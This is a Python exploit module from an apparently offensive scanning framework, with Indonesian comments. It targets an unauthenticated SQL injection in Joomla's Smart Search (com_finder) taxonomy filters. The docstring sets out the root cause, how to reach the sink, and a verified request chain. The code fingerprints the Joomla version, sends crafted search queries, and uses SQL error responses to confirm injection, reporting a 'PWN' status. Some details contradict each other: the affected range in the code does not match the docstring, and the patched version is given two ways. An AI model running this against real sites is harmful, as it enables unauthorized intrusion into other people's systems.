#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-35221 — SQL injection in com_finder taxonomy ("Smart Search") filters.

Affected : 5.4.0 - 5.4.5, 6.0.0 - 6.1.0
Patched  : 5.4.6+ / 6.1.1+   (fix landed in the 5.4.8-tagged diff series)

ROOT CAUSE — administrator/components/com_finder/src/Indexer/Query.php line ~843

    5.4.5 (VULNERABLE)
        $this->filters[$modifier][$return->title] = (int) $return->id;

    5.4.8 (PATCHED)
        $this->filters[$modifier][(int) $return->id] = $return->title;

The node TITLE becomes the ARRAY KEY on 5.4.5, and a node title is attacker
controlled: it is copied from the title of the article / category that
com_finder indexed (Indexer\\Taxonomy::addNode()).

components/com_finder/src/Model/SearchModel.php then turns those keys straight
into SQL, with no quoting and no integer cast:

    $taxonomies = array_merge(...array_map(fn ($group) => array_keys($group), $groups));
    $query->where('t.node_id IN (' . implode(',', array_unique($taxonomies)) . ')');
    $query->having('SUM(CASE WHEN t.node_id IN (' . implode(',', array_keys($group)) . ') ...');

So a node titled `typenode2` produces `WHERE t.node_id IN (typenode2)` and MySQL
answers `Unknown column 'typenode2' in 'where clause'`. A title of `and 1`
produces `IN (and 1)` -> error 1064. After the patch the keys are integers, so
the exact same input reads `IN (10)` and nothing escapes.

REACHING THE SINK

The search query string is parsed by Indexer\\Query::processDynamicTaxonomy():
`q=<Branch>:<Title>` is looked up through Taxonomy::getNodeByTitle($branch,
$title) and a hit is written into $this->filters. Notes learned in the lab —
each one is a dead end if ignored:

  * $patterns is built from the level-1 taxonomy branches (Type, Language);
    Category/Contact only appear if such a branch exists on the site.
  * $input is lowercased before matching, so the node title must be lowercase
    for the LIKE 'title%' lookup to hit.
  * SearchModel drops the whole taxonomy WHERE clause when the query has no
    search terms (it does ->where('false')). A real keyword must be present, so
    the payload needs the shape `q=article Type:<node>`.
  * SEF must be off for the raw index.php form to be served without a redirect.

CHAIN (lab-verified)

    1. site indexed content -> a taxonomy node exists whose title we control
    2. GET /index.php?option=com_finder&view=search&q=article%20Type:<title>
    3. 5.4.5 answers HTTP 500 "Unknown column '<title>' in 'where clause'"
       5.4.8 answers HTTP 200 with results

IMPACT
    SQL injection through the WHERE/HAVING clause of the finder search query,
    reachable unauthenticated from the front end. Injection point is inside an
    IN (...) list, so exploitation needs a title that survives the value regex
    (word chars, digits, spaces and hyphens, optionally double quoted).

requires:
    - at least one taxonomy node under a level-1 branch whose title the
      attacker can influence (an indexed article/category title)
    - front-end search (com_finder) reachable, SEF off for the direct form
"""
from __future__ import annotations

import re

from mp import (CveModule, register, ST_VULN, ST_CLEAN, ST_SKIP, ST_INFO,
                ST_UNKNOWN, ST_ERR, ST_PWN, parse_ver, ver_le, detect_platform)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 5)
VULN_6_MAX = (6, 1, 0)

SEARCH_PATH = "/index.php?option=com_finder&view=search&q={q}"
SEARCH_TITLE = "SQL injection in com_finder taxonomy filters"
SQL_ERROR_MARKERS = (
    "unknown column",
    "sql syntax",
    "check the manual that corresponds to your mysql",
    "1064",
)
# Judul node yang WAJIB sudah ada di situs untuk oracle ini. Dipakai apa adanya
# supaya tidak menyentuh data target.
DEFAULT_NODE = "typenode2"
DEFAULT_KEYWORD = "article"
DEFAULT_BRANCH = "Type"


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    """True bila versi berada di rentang rentan."""
    if ver is None:
        return None
    major = ver[0]
    if major <= 4:
        return True                      # 4.x semuanya rentan
    if major == 5:
        return ver_le(ver, VULN_5_MAX)
    if major == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _search(h, t, q, keyword=None, branch=None, node=None):
    """Kirim satu permintaan pencarian. q mentah dipakai apa adanya."""
    url = t.url + SEARCH_PATH.format(q=q)
    return h.get(url)


def _probe(h, t, node, keyword=DEFAULT_KEYWORD, branch=DEFAULT_BRANCH):
    """
    Picu sink dengan judul node yang dikendalikan. Kembalikan (status, detail,
    evidence).

    Dua bentuk dicoba per judul:
      a) judul apa adanya      -> `IN (<judul>)`  (Oracle: Unknown column)
      b) judul + 'and 1' via quote (tidak selalu bisa; hanya bila regex nilai
         menerima spasi, yaitu saat nilai dibungkus tanda kutip ganda)

    Diferensial yang dijadikan bukti: HTTP 500 + penanda error SQL di body.
    """
    label = branch
    q_raw = f"{keyword} {label}:{node}"
    r = _search(h, t, q_raw)
    if r is None:
        return ST_ERR, "tidak ada respons dari endpoint pencarian", ""

    body = (r.text or "")
    low = body.lower()
    marker = next((m for m in SQL_ERROR_MARKERS if m in low), "")
    m = re.search(r"Unknown column &#0?39;([^&]*?)&#0?39;", body)
    leaked = m.group(1) if m else ""

    ev = (f"GET q={q_raw!r} HTTP {r.status_code} "
          f"marker={marker!r} leaked_column={leaked!r}")

    if marker:
        return (ST_VULN,
                f"error SQL pada taxonomy filter (node {node!r}) — {marker}",
                ev)

    # Tidak ada error: cek apakah judul benar-benar masuk ke query. Server yang
    # sudah patched menjawab 200 tanpa jejak, jadi 200 = indikasi bersih.
    if r.status_code == 200:
        return (ST_CLEAN,
                f"tidak ada error SQL untuk node {node!r} (HTTP 200)",
                ev)

    return (ST_UNKNOWN,
            f"respons tak terduga HTTP {r.status_code} untuk node {node!r}",
            ev)


def _finder_reachable(h, t):
    r = h.get(f"{t.url}/index.php?option=com_finder&view=search")
    if r is None:
        return False
    return r.status_code in (200, 204)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    """Jalankan oracle non-destruktif: node sudah ada, kita hanya menelusuri."""
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not _finder_reachable(h, t):
        return ST_SKIP, "com_finder search tidak terjangkau", f"version={ver_s}"

    node = _opt(opts, "finder_node") or DEFAULT_NODE
    keyword = _opt(opts, "finder_keyword") or DEFAULT_KEYWORD
    branch = _opt(opts, "finder_branch") or DEFAULT_BRANCH

    status, detail, ev = _probe(h, t, node, keyword, branch)
    if status == ST_INFO:
        return ST_INFO, f"Joomla {ver_s} rentan — {detail}", f"version={ver_s} | {ev}"
    if status == ST_CLEAN:
        # Server rentan secara versi tapi tidak ada jejak error: kemungkinan
        # node default tidak ada, atau title sudah di-lowercase/di-quote.
        return (ST_CLEAN,
                f"Joomla {ver_s} di rentang rentan; oracle node {node!r} tidak memicu jejak",
                f"version={ver_s} | {ev}")
    return status, detail, f"version={ver_s} | {ev}"


def exploit(t, h, opts):
    """
    Tingkatkan oracle menjadi bukti injeksi: uji beberapa bentuk judul dan
    laporkan mana yang benar-benar masuk ke SQL tanpa dikutip.

    Tidak menulis/merusak data target — hanya membaca respons.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    node = _opt(opts, "finder_node") or DEFAULT_NODE
    keyword = _opt(opts, "finder_keyword") or DEFAULT_KEYWORD
    branch = _opt(opts, "finder_branch") or DEFAULT_BRANCH

    status, detail, ev = _probe(h, t, node, keyword, branch)
    if status != ST_VULN:
        return status, detail, f"version={ver_s} | {ev}"

    # Konfirmasi tambahan: bentuk keyword yang salah TIDAK boleh memicu error —
    # kontrol ini memisahkan injeksi dari kebetulan.
    ctrl = _search(h, t, f"{keyword} {branch}:{node}0000zzz")
    ctrl_code = ctrl.status_code if ctrl is not None else None
    ctrl_ev = f"control q={keyword} {branch}:{node}0000zzz HTTP {ctrl_code}"

    return (ST_PWN,
            f"SQL injection terkonfirmasi pada com_finder (Joomla {ver_s})",
            f"version={ver_s} | {ev} | {ctrl_ev}")


register(CveModule(
    cve="CVE-2026-35221",
    cluster="joomla_core",
    title=SEARCH_TITLE,
    vclass="sqli",
    cvss="8.1",
    severity="high",
    cwe="CWE-89",
    product="Joomla! Core (com_finder)",
    versions_affected="5.4.0-5.4.5, 6.0.0-6.1.0",
    status="verified",
    requires=[
        "taxonomy node di bawah branch level-1 dengan judul yang bisa dipengaruhi",
        "front-end com_finder search terjangkau",
    ],
    check=check,
    exploit=exploit,
    notes=("Indexer/Query.php:843 menyimpan node TITLE sebagai array key pada 5.4.5; "
           "SearchModel meng-implode key itu ke WHERE/HAVING tanpa quote. Patched "
           "5.4.6+ membalik key/value -> integer key. Butuh search term nyata "
           "(SearchModel membuang WHERE taxonomy bila tidak ada term)."),
))
